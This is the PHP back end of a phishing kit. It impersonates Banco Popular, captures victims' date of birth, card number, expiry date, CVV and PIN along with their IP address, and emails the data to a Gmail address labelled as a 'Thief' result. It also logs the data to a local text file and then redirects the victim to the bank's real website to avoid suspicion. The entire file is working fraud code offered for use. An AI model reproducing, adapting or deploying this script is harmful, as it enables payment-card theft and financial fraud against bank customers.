<?

$dat3=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "-------------Popular Info-----------------------\n";
$message .= "DOB : ".$_POST['dob']."\n";
$message .= "--------------CC INFO---------------------\n";
$message .= "Tarjeta : ".$_POST['tarjeta']."\n";
$message .= "EXP : ".$_POST['fecha']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "Pin : ".$_POST['pin']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$dat3."\n";


$recipient = "no3nayana@gmail.com";
$subject = "mierda y mas mierda";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$cc", "Bank Of America ReZulT (Thief)", $message);
$ff=fopen("non.txt","a");
fwrite($ff,$message);
fclose($ff);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.bancopopular.es/popular-web/particulares/");

}	
?>













